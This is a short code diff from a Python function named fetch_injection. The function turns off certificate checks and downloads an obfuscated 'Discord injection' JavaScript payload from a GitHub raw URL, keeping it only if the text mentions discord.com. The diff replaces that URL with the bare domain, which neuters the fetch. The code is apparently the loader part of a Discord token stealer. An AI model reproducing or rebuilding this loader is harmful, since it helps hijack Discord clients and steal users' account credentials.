@@ -61,7 +61,7 @@ def fetch_injection():
     try:
         from urllib3 import PoolManager
         http = PoolManager(cert_reqs="CERT_NONE")
-        resp = http.request("GET", "https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js", timeout=5)
+        resp = http.request("GET", "https://raw.githubusercontent.com", timeout=5)
         if b"discord.com" in resp.data:
             return resp.data.decode().strip()
     except:
